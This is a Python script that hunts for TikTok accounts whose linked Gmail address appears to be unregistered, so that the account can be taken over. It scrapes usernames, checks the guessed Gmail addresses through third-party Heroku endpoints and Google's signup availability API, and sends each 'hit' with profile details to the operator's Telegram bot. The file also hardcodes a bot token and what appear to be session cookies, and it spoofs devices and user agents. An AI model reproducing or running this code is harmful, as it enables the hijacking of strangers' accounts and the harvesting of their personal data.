#------------------------------[الالوان]-----------------------
Z = '\033[1;31m';X = '\033[1;33m';F = '\033[2;32m' ;C = "\033[1;97m";B = '\033[2;36m';Y = '\033[1;34m';C = "\033[1;97m";E = '\033[1;31m';B = '\033[2;36m';G = '\033[1;32m';S = '\033[1;33m'
#------------------------------[zaid]----------------------------
try:import os,sys,webbrowser,socket,json,requests,random;from user_agent import generate_user_agent;from uuid import uuid4;import uuid;from bs4 import BeautifulSoup;from datetime import datetime;import telebot;import time;from random import randint, choice;from urllib.parse   import urlencode, quote
except:os.system("pip install requsets");os.system("pip install names");os.system("pip install user_agent");os.system("pip install uid");os.system("pip install uuid");os.system("pip install webbrowser");os.system("pip install socket");os.system("pip install datetime");os.system("pip install bs4");os.system("pip install telebot");os.system("pip install urllib");os.system("clear")
import secrets
from telebot import types
cokie  = secrets.token_hex(8)*2
ya=0;no=0;nod=0;yas=0;em=0
zaidip = socket.gethostname()
ipzaid = socket.gethostbyname(zaidip)
url_ip = requests.get('https://pastebin.com/iXNMindq').text
if ipzaid in url_ip:
	os.system('clear')
else :
	os.system('clear')
	print(f'{S} OF The Tools Programmer Zaid ')
	print(f' {F}@P_W_7 ')
	exit()
	
try:
	sessionid="{}".format(str(secrets.token_hex(8) * 2))
	header = {"User-Agent": 'Mozilla/5.0 (Linux; Android 10; Lenovo K12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}
	zzzug=requests.get('https://www-useast1a.tiktok.com/passport/web/user/login/?',headers=header).cookies.get_dict()['passport_csrf_token']
except:
	print(' حدث خطأ في الانترنت اعد تشغيل')
	exit()

ID= '5949387072'
tok= '6710299953:AAFm5oiF6w1QavYf0P2YbNS3ip08b3KdqKk'
ugen,viv=[],[]
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
os.system('clear')
bot = telebot.TeleBot(tok)

def info(email):
	email=str(email)
	user = email.split('@')[0]
	try:
		url = 'http://tik.report.ilebo.cc/users/login'
		he = {
	'X-IG-Capabilities': '3brTvw==',
	'User-Agent': 'TikTok 85.0.0.21.100 Android (33/13; 480dpidpi; 1080x2298; HONOR; ANY-LX2; ANY-LX2;)',
	'Accept-Language': 'en-US',
	'Content-Type': 'application/json; charset=utf-8',
	'Content-Length': '73',
	'Host': 'tik.report.ilebo.cc',
	'Connection': 'Keep-Alive',
	'Accept-Encoding': 'gzip',
	}
		da={"unique_id":f"{user}","purchaseTokens":[]}
	
		re=requests.post(url,headers=he,data=da).json()
		id = re['data']['user']['user']['id']
		user = re['data']['user']['user']['uniqueId']
		name = re['data']['user']['user']['nickname']
		folon = re['data']['user']['stats']['followingCount']
	
		folos = re['data']['user']['stats']['followerCount']
		lik = re['data']['user']['stats']['heartCount']
		vid = re['data']['user']['stats']['videoCount']
		age = re['data']['user']['user']['underAge18']
		priv = re['data']['user']['user']['privateAccount']
		bio = re['data']['user']['user']['signature']
		ff = (f'''
𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐓𝐈𝐊𝐓𝐎𝐊
═══════════════════
𝑷𝑹𝑶𝑮𝑹𝑨𝑴 : @P_W_7 | 
═══════════════════
𝙽𝙰𝙼𝙴 : {name}
𝚄𝚂𝙴𝚁𝙽𝙰𝙼𝙴 : {user}
𝙶𝙼𝙰𝙸𝙻 : {email}
𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚁𝚂 : {folos}
𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : {folon}
𝙻𝙸𝙺𝙴 : {lik}
𝙸𝙳 : {id}
𝙿𝚁𝙸𝚅𝙰𝚃𝙴 : {priv}
𝚅𝙴𝙳𝙾 : {vid}
𝙰𝙶𝙴 : {age}
𝙱𝙸𝙾 : {bio}
═══════════════════
	''')
		print(ff)
		bot.send_message(ID,f"<strong>{ff}</strong>",parse_mode="html",reply_markup=types.InlineKeyboardMarkup())
	except:
		tt=f'''
𝐇𝐈𝐓 𝐀𝐂𝐂𝐎𝐔𝐍𝐓 𝐓𝐈𝐊𝐓𝐎𝐊
═══════════════════
𝙶𝙼𝙰𝙸𝙻 : {email}
═══════════════════
𝑷𝑹𝑶𝑮𝑹𝑨𝑴𝑴𝑹 : @P_W_7 | 
''';bot.send_message(ID,f"<strong>{tt}</strong>",parse_mode="html",reply_markup=types.InlineKeyboardMarkup())


def zaid():
 while True:
  try:
                  header = {"User-Agent": 'Mozilla/5.0 (Linux; Android 10; Lenovo K12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36'}
                  msToken=requests.get('https://www-useast1a.tiktok.com/passport/web/user/login/?',headers=header).cookies.get_dict()['msToken']
                  ttwid=requests.get('https://www.tiktok.com/',headers=header).cookies.get_dict()['ttwid']
  except:
    pass
    zaid()
  try:
   country=random.choice(['PK', 'IQ', 'KR','VN'])
   pro = random.choice(ugen)
   rng=int("".join(choice('456789')for i in range(1)))
   user='qwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnm'
   name=str("".join(random.choice(user)for i in range(rng)))
   params = urlencode({
'aid'               : 1988,
'app_language'      : 'en',
'app_name'          : 'tiktok_web',
'battery_info'      : '0.6',
'browser_language'  : 'en',
'browser_name'      : 'Mozilla',
'browser_online'    : 'true',
'browser_platform'  : 'Win32',
'browser_version'   : '5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
'channel'           : 'tiktok_web',
'cookie_enabled'    : 'true',
'device_id'         : randint(6999999999999999999, 7122222222222222222),
'device_platform'   : 'web_pc',
'focus_state'       : 'true',
'from_page'         : 'user',
'history_len'       : '3',
'is_fullscreen'     : 'false',
'is_page_visible'   : 'true',
'os'                : 'windows',
'priority_region'   : f'{country}',
'referer'           : '',
'region'            : f'{country}',
"screen_height"     :   randint(777, 888),
"screen_width"      :   randint(1333, 1666),
'tz_name'           : 'Europe/London',
'keyword'         : name,
'webcast_language'  : 'en',
})
   u=f'https://www.tiktok.com/api/search/user/full/?{params}'
   h={'Cookie':'ttwid='+ttwid+'; tiktok_webapp_theme=light; msToken=2cFfY83w7ZYqeJfgSrtprxuGTSGt6Gc0eDwFbgXg9X2H9QKDvqyP84CCl5rQLohHqsWmMbFe6wbNEP8-opBSk0lOsyjuzONVAKvkGqzDSqpjF06wiD6q7dttLj8SXD1G3Hrp; ttwid='+ttwid+'; passport_csrf_token='+zzzug+'; passport_csrf_token_default='+zzzug+'; uid_tt=586f8c5249e9ca4373252f9eee8e7c83c9d67acce516a2f60263e96bd2d05513; uid_tt_ss=586f8c5249e9ca4373252f9eee8e7c83c9d67acce516a2f60263e96bd2d05513; sid_tt='+sessionid+'; sessionid='+sessionid+'; sessionid_ss='+sessionid+'; sid_ucp_v1=1.0.0-KDM4Mzc5NGVjZjZiMTI2YmMwNDliMWZhYTFiZjRmNDQzYjBhMTFmNDkKIAiCiKiSlOmvu2MQgeeEoQYYswsgDDD3_tqbBjgBQOoHEAMaBm1hbGl2YSIgZDI2MTYzZjY4ZTZjOTVkNDljMDNlYzdmNzJkNzAwN2Q; ssid_ucp_v1=1.0.0-KDM4Mzc5NGVjZjZiMTI2YmMwNDliMWZhYTFiZjRmNDQzYjBhMTFmNDkKIAiCiKiSlOmvu2MQgeeEoQYYswsgDDD3_tqbBjgBQOoHEAMaBm1hbGl2YSIgZDI2MTYzZjY4ZTZjOTVkNDljMDNlYzdmNzJkNzAwN2Q; store-idc=maliva; store-country-code=tr; store-country-code-src=uid; tt-target-idc=useast1a; tt-target-idc-sign=cQMNfSjvvlNBGrwBOVqQa00_v09uRkDCThX0h3WaTo3QkciqJxdiEQWfUogQifipphJ2Ew8lBPW5swp2QVAyQLMcRUZM7pXPh0HyaHO8KrEiK9A3hSGZBZxSEAtjUhUMDQUDKDoC0cR0zeg-w2kkEIzXQLMsCGEMP93BoNLamPReCgAQrzLXVcgIYxWPpL5a-6aGuB43e42MWOqeJ5YSA9r0Un4DqveL_K1-LXhXjSwcnPfR6vF53zPExkDb2QMG0jvHTef2Y-aXwqVhDrmc22wJAL5bMgEqtWhsdetK292OW6-_yY0vNW4FeADvZClor00lmXAXqgknfgEXkqbWe8oDu4o4-WTVM8Y0YMAJeS7RJkEW_2Di7V1o17gI8-dYhyE7Zi_Gm9junoMOnpbye8K-E1Tr6NEmp-ceoY1_ic6BewgUoVNqe3A6sYigbBydUam2obTHgrQgOD0Qss3TjvigPlTsC8DrE9DXhiSqAe-dCSnuEL_2tbfXt433ZkPE; tt_csrf_token=PSOxiSio-0SwWbZDgx1udkrvw10E6D869hY4; tt_chain_token=xzQFbQnJcDXq3OHhlmhPQA==; __tea_cache_tokens_1988={%22_type_%22:%22default%22%2C%22user_unique_id%22:%227215088339640649222%22%2C%22timestamp%22:1679893715575}; passport_fe_beating_status=true; csrf_session_id=3f2907b98fa47d37c429fe3249297a97; msToken='+msToken+'',
                        'User-Agent':pro}
   r=requests.get(u,headers=h).json()
   rzo = r['user_list']
   for usz in rzo:
    email=str(usz['user_info']['unique_id'])
    if '_' in email:
    	continue
    else:
    	global ya,no,nod,yas
    	email=str(email)+'@gmail.com'
    	ur=random.choice(['https://apitooltik2-52d429e531c7.herokuapp.com/','https://apitooltik-71e7fef79f62.herokuapp.com/'])
    	try:
    		rr = requests.post(f'{ur}zaid/?email={email}').text
    	except:
    		rr = requests.post(f'{ur}zaid/?email={email}').text
    	#print(rr)
    	if 'Good' in rr:
    		os.system('cls'if os.name=='net'else'clear')
    		ya+=1
    		print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
    		eml=str(email)
    		email=eml.split('@')[0]+'@gmail.com'
    		he3 = {
	    "accept": "*/*",
	    "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
	    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
	    "google-accounts-xsrf": "1",
	    "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
	    "sec-ch-ua-arch": "\"\"",
	    "sec-ch-ua-bitness": "\"\"",
	    "sec-ch-ua-full-version": "\"116.0.5845.72\"",
	    "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
	    "sec-ch-ua-mobile": "?1",
	    "sec-ch-ua-model": "\"ANY-LX2\"",
	    "sec-ch-ua-platform": "\"Android\"",
	    "sec-ch-ua-platform-version": "\"13.0.0\"",
	    "sec-ch-ua-wow64": "?0",
	    "sec-fetch-dest": "empty",
	    "sec-fetch-mode": "cors",
	    "sec-fetch-site": "same-origin",
	    "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
	    "x-client-data": "CJjbygE=",
	    "x-same-domain": "1",
	    "Referrer-Policy": "strict-origin-when-cross-origin",
	'user-agent': generate_user_agent()};tokk=requests.get('https://ssh5o-8ce98cab62ff.herokuapp.com/').text;da=(f'continue=https%3A%2F%2Fwww.google.com%2F&dsh=S1644399110%3A1695515527985204&flowEntry=ServiceLogin&hl=ar&ifkv=AYZoVhctgJglce8ngDS-YYmRkMjKcyuUZeIA6MlKZuxdmLk8INHHJp3tpqbQVyTNKjkpytBw8jTBiw&theme=glif&f.req=%5B%22{tokk}%22%2C%22zaid%22%2C%22ar%22%2C%22zaid%22%2C%22ar%22%2C0%2C0%2Cnull%2Cnull%2C%22web-glif-signup%22%2C0%2Cnull%2C1%2C%5Bnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2C1%5D&azt=AFoagUWvOuuV65yGblelgMb8YgqIxqf-PQ%3A1695546705215&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2C%22IQ%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5Bnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C0%2Cnull%2C0%2C2%2C%22%22%2Cnull%2Cnull%2C0%2C0%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&checkConnection=youtube%3A847%3A1&checkedDomains=youtube&pstMsg=1&]');zaid= requests.post('https://accounts.google.com/_/signup/validatepersonaldetails?hl=ar&_reqid=43956&rt=j',headers=he3,data=da).text;tl=zaid.split('["gf.ttu",null,"')[1].split('"],')[0];url = f'https://accounts.google.com/_/signup/usernameavailability?hl=ar&TL={tl}&_reqid=765070&rt=j';headers={
			'Accept': '*/*',
			'Accept-Encoding': 'gzip, deflate, br',
			'Accept-Language': 'en-US,en;q=0.9',
			'Content-Length': '898',
			'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
			'Cookie': cokie,
			'Google-Accounts-Xsrf': '1',
			'Origin': 'https://accounts.google.com',
			'Referer': f'https://accounts.google.com/signup/v2/emailsignup?sjid=12488103466622635336-EU&theme=glif&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}',
			'Sec-Ch-Ua': '"Not;A=Brand";v="8", "Chromium";v="117", "Google Chrome";v="117"',
			'Sec-Ch-Ua-Arch': '"x86"',
			'Sec-Ch-Ua-Bitness': '"64"',
			'Sec-Ch-Ua-Full-Version': '"117.0.5938.63"',
			'Sec-Ch-Ua-Full-Version-List': '"Not;A=Brand";v="8.0.0.0", "Chromium";v="117.0.5938.63", "Google Chrome";v="117.0.5938.63"',
			'Sec-Ch-Ua-Mobile': '?0',
			'Sec-Ch-Ua-Model': '""',
			'Sec-Ch-Ua-Platform': '"Windows"',
			'Sec-Ch-Ua-Platform-Version': '"15.0.0"',
			'Sec-Ch-Ua-Wow64': '?0',
			'Sec-Fetch-Dest': 'empty',
			'Sec-Fetch-Mode': 'cors',
			'Sec-Fetch-Site': 'same-origin',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
			'X-Same-Domain': '1',
		};data={
			'theme': 'glif',
			'continue': 'https://accounts.google.com/ManageAccount?nc=1',
			'f.req': f'["TL:{tl}","{str(email)}",0,0,0,null,0,3508]',
			'at': 'AFoagUU9EVwn5NhOjSbSekGRb853taFYlw:1695481442901',
			'azt': 'AFoagUUmBNb6Od8MKLAz3aR1k7PQTrK84Q:1695481442901',
			'cookiesDisabled': 'false',
			'deviceinfo': '[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,0,1,"",null,null,2,2]',
			'gmscoreversion': 'undefined',
			'flowName': 'GlifWebSignIn',
			'checkConnection': 'youtube:671:0',
			'checkedDomains': 'youtube',
			'pstMsg': '1',
		}
	
    		try:
    			rr = requests.post(url,headers=headers,data=data).text
    			#print(rr)
    		except:
    			print('')
    		if '"gf.uar",1,' in rr:
    			yas+=1
    			os.system('cls'if os.name=='net'else'clear')
    			info(email)
    			print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
    		else:
    			os.system('cls'if os.name=='net'else'clear')
    			nod+=1
    			#print(zom)
    			print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
    	else:
    		os.system('cls'if os.name=='net'else'clear')
    		no+=1
    		print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')

  except:
    pass 
    zaid()


def zaidlist():
	au=[]
	try:
		ada = int(input(f'{S}∆ - Write Numper User : '))
		print('')
		print(f'{B}═════════════════════════════')
	except ValueError:
		print(f'{S} Error Input :) ')
	if ada<1:
		print(f'{S} Error Input :) ')
	for met in range(ada):
		us = input(f'{S}{met} - Write User Tiktok : ')
		print('')
		print(f'{B}═════════════════════════════')
		au.append(us)
	for user in au:
		try:
			url = 'http://tik.report.ilebo.cc/users/login';he = {
	'X-IG-Capabilities': '3brTvw==',
	'User-Agent': 'TikTok 85.0.0.21.100 Android (33/13; 480dpidpi; 1080x2298; HONOR; ANY-LX2; ANY-LX2;)',
	'Accept-Language': 'en-US',
	'Content-Type': 'application/json; charset=utf-8',
	'Content-Length': '73',
	'Host': 'tik.report.ilebo.cc',
	'Connection': 'Keep-Alive',
	'Accept-Encoding': 'gzip',
	};da={"unique_id":f"{user}","purchaseTokens":[]};re=requests.post(url,headers=he,data=da).json()
			id = re['data']['user']['user']['id']
			print(f'>ID Your Account : {E}{id}')
		except:
				os.system('clear')
				print(f'Error User : {user}')
		url = f'https://api2-19-h2.musical.ly/aweme/v1/user/following/list/?user_id={id}&max_time=0&count=200&offset=0&source_type=2&address_book_access=2&gps_access=2&manifest_version_code=2019081160&_rticket=1694547483074&app_language=ar&current_region=IQ&app_type=normal&iid=7278024586699523845&channel=googleplay&device_type=SM-N960N&language=ar&locale=ar&resolution=720*1280&openudid=19e5434d5417cdcb&update_version_code=2019081160&sys_region=EG&os_api=28&uoo=0&is_my_cn=0&timezone_name=Asia%2FBaghdad&dpi=320&residence=IQ&carrier_region=IQ&ac=wifi&device_id=7272729095556662789&pass-route=1&mcc_mnc=41820&os_version=9&timezone_offset=10800&version_code=120603&carrier_region_v2=418&app_name=musical_ly&ab_version=12.6.3&version_name=12.6.3&device_brand=samsung&ssmix=a&pass-region=1&device_platform=android&build_number=12.6.3&region=EG&aid=1233&ts=1694547477&sec_user_id={user}';he = {
            'Host': 'api2-19-h2.musical.ly',
            'accept-encoding': 'gzip',
            'sdk-version': '1',
            'cookie': 'store-idc=maliva; store-country-code=iq; d_ticket=75f95e60c9cde3facb8a2439ba7ae961c041b; passport_csrf_token_default=efd0ea2687a947be434c6524721ac06e; odin_tt=f3be583347fd2518a759031ef11d5d1689c1da8da26dc6f75c5af6e63415f455dff04a813d191640436119eec0f23115be695337bf00b4e942a9f43d770598609a5502760e788ca9aa8ee7f5bc1f4b12; sid_guard=838773198b8ebc47900c997493f06e17%7C1694547407%7C15551999%7CSun%2C+10-Mar-2024+19%3A36%3A46+GMT; uid_tt=87a4e2238bd92924b8b9f26d811871f20f4d886c41b0c2c4df40ce7476408331; sid_tt=838773198b8ebc47900c997493f06e17; sessionid=838773198b8ebc47900c997493f06e17; store-country-code-src=uid',
            'x-tt-token': '03838773198b8ebc47900c997493f06e1705a79067fed630a2c16bd4f60750606123d398071c0ecee0fd617a0697c63ec832afcf3fe4725d522a3892e6c6d2eeb883f6b3c9e43075815a5e99d16d4dcae6eaebf7d9bd94c0adb0c41319139bc34fb34-CkBiNzEyOGZjZjliMTI1MDZkMTkwMzRlOWY1ZWZiYTdmYzE1ZTNlOTc0YWJhZjIzOWMzN2U4ZGE5MzI4MTBjNzhk-2.0.0',
            'x-khronos': '1694549064',
            'x-gorgon': '8300ea164000e65d9b4756041c6b3743225fd6450a2e4dadf734',
            'user-agent': 'okhttp/3.10.0.1',
            }
		re = requests.get(url,headers=he).json()
		zz=0
		try:
			while True:
				zz+=1
				us=(re['followings'][zz]['unique_id'])
				email=us
				global ya,no,nod,yas
				email=str(email)+'@gmail.com'
				ur=random.choice(['https://apitooltik2-52d429e531c7.herokuapp.com/','https://apitooltik-71e7fef79f62.herokuapp.com/'])
				try:
					rr = requests.post(f'{ur}zaid/?email={email}').text
				except:
					rr = requests.post(f'{ur}zaid/?email={email}').text
				#print(rr)
				if 'Good' in rr:
						os.system('cls'if os.name=='net'else'clear')
						ya+=1
						print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
						eml=str(email)
						email=eml.split('@')[0]+'@gmail.com'
						he3 = {
	    "accept": "*/*",
	    "accept-language": "ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6",
	    "content-type": "application/x-www-form-urlencoded;charset=UTF-8",
	    "google-accounts-xsrf": "1",
	    "sec-ch-ua": "\"Not)A;Brand\";v=\"24\", \"Chromium\";v=\"116\"",
	    "sec-ch-ua-arch": "\"\"",
	    "sec-ch-ua-bitness": "\"\"",
	    "sec-ch-ua-full-version": "\"116.0.5845.72\"",
	    "sec-ch-ua-full-version-list": "\"Not)A;Brand\";v=\"24.0.0.0\", \"Chromium\";v=\"116.0.5845.72\"",
	    "sec-ch-ua-mobile": "?1",
	    "sec-ch-ua-model": "\"ANY-LX2\"",
	    "sec-ch-ua-platform": "\"Android\"",
	    "sec-ch-ua-platform-version": "\"13.0.0\"",
	    "sec-ch-ua-wow64": "?0",
	    "sec-fetch-dest": "empty",
	    "sec-fetch-mode": "cors",
	    "sec-fetch-site": "same-origin",
	    "x-chrome-connected": "source=Chrome,eligible_for_consistency=true",
	    "x-client-data": "CJjbygE=",
	    "x-same-domain": "1",
	    "Referrer-Policy": "strict-origin-when-cross-origin",
	'user-agent': generate_user_agent()};tokk=requests.get('https://ssh5o-8ce98cab62ff.herokuapp.com/').text;da=(f'continue=https%3A%2F%2Fwww.google.com%2F&dsh=S1644399110%3A1695515527985204&flowEntry=ServiceLogin&hl=ar&ifkv=AYZoVhctgJglce8ngDS-YYmRkMjKcyuUZeIA6MlKZuxdmLk8INHHJp3tpqbQVyTNKjkpytBw8jTBiw&theme=glif&f.req=%5B%22{tokk}%22%2C%22zaid%22%2C%22ar%22%2C%22zaid%22%2C%22ar%22%2C0%2C0%2Cnull%2Cnull%2C%22web-glif-signup%22%2C0%2Cnull%2C1%2C%5Bnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2C1%5D&azt=AFoagUWvOuuV65yGblelgMb8YgqIxqf-PQ%3A1695546705215&cookiesDisabled=false&deviceinfo=%5Bnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2C%22IQ%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22%2Cnull%2C%5Bnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C%5B%5D%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C0%2Cnull%2C0%2C2%2C%22%22%2Cnull%2Cnull%2C0%2C0%5D&gmscoreversion=undefined&flowName=GlifWebSignIn&checkConnection=youtube%3A847%3A1&checkedDomains=youtube&pstMsg=1&]');zaid= requests.post('https://accounts.google.com/_/signup/validatepersonaldetails?hl=ar&_reqid=43956&rt=j',headers=he3,data=da).text;tl=zaid.split('["gf.ttu",null,"')[1].split('"],')[0];url = f'https://accounts.google.com/_/signup/usernameavailability?hl=ar&TL={tl}&_reqid=765070&rt=j';headers={
			'Accept': '*/*',
			'Accept-Encoding': 'gzip, deflate, br',
			'Accept-Language': 'en-US,en;q=0.9',
			'Content-Length': '898',
			'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
			'Cookie': cokie,
			'Google-Accounts-Xsrf': '1',
			'Origin': 'https://accounts.google.com',
			'Referer': f'https://accounts.google.com/signup/v2/emailsignup?sjid=12488103466622635336-EU&theme=glif&flowName=GlifWebSignIn&flowEntry=SignUp&TL={tl}',
			'Sec-Ch-Ua': '"Not;A=Brand";v="8", "Chromium";v="117", "Google Chrome";v="117"',
			'Sec-Ch-Ua-Arch': '"x86"',
			'Sec-Ch-Ua-Bitness': '"64"',
			'Sec-Ch-Ua-Full-Version': '"117.0.5938.63"',
			'Sec-Ch-Ua-Full-Version-List': '"Not;A=Brand";v="8.0.0.0", "Chromium";v="117.0.5938.63", "Google Chrome";v="117.0.5938.63"',
			'Sec-Ch-Ua-Mobile': '?0',
			'Sec-Ch-Ua-Model': '""',
			'Sec-Ch-Ua-Platform': '"Windows"',
			'Sec-Ch-Ua-Platform-Version': '"15.0.0"',
			'Sec-Ch-Ua-Wow64': '?0',
			'Sec-Fetch-Dest': 'empty',
			'Sec-Fetch-Mode': 'cors',
			'Sec-Fetch-Site': 'same-origin',
			'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
			'X-Same-Domain': '1',
		};data={
			'theme': 'glif',
			'continue': 'https://accounts.google.com/ManageAccount?nc=1',
			'f.req': f'["TL:{tl}","{str(email)}",0,0,0,null,0,3508]',
			'at': 'AFoagUU9EVwn5NhOjSbSekGRb853taFYlw:1695481442901',
			'azt': 'AFoagUUmBNb6Od8MKLAz3aR1k7PQTrK84Q:1695481442901',
			'cookiesDisabled': 'false',
			'deviceinfo': '[null,null,null,[],null,"IQ",null,null,null,"GlifWebSignIn",null,[null,null,[],null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[],null,null,null,null,[]],null,null,null,null,1,null,0,1,"",null,null,2,2]',
			'gmscoreversion': 'undefined',
			'flowName': 'GlifWebSignIn',
			'checkConnection': 'youtube:671:0',
			'checkedDomains': 'youtube',
			'pstMsg': '1',
		}
	
						try:
							rr = requests.post(url,headers=headers,data=data).text
							#print(rr)
						except:
							print('')
						if '"gf.uar",1,' in rr:
							yas+=1
							os.system('cls'if os.name=='net'else'clear')
							info(email)
							print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
						else:
							os.system('cls'if os.name=='net'else'clear')
							nod+=1
							#print(zom)
							print(f'\033[2;36m═══════════════════════════\n\033[2;36m 1 - \033[1;34mDones Email : \033[2;36m{ya}\n \033[2;36m2 - \033[1;33mError Email : \033[2;36m{no}\n\033[2;36m 3 -\033[1;31m Error Gmail : \033[2;36m{nod}\n\033[2;36m 4 -\033[2;32m Dones Gmail : \033[2;36m{yas}\n\033[2;36m 5 - Check Email : \033[2;36m{email}\n\033[2;36m═══════════════════════════\n  \033[1;33mProgrammer \033[2;32m@P_W_7 ')
				else:
						os.system('cls'if os.name=='net'else'clear')
						no+=1
